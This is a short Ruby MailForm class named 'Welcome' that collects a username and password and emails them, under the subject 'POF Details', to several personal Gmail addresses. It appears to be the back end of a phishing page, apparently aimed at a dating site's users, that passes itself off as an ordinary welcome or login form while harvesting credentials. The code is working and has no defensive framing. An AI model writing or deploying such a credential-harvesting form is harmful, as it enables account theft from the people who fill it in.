class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers

      {
        :subject => "POF Details ",
        :from => %("#{username}"),
        :to => 'Nwachinemerenwagboso@gmail.com',
        :cc => 'delightedchika@gmail.com',
        :bcc => "daveskeen24@gmail.com"

      }
end


end
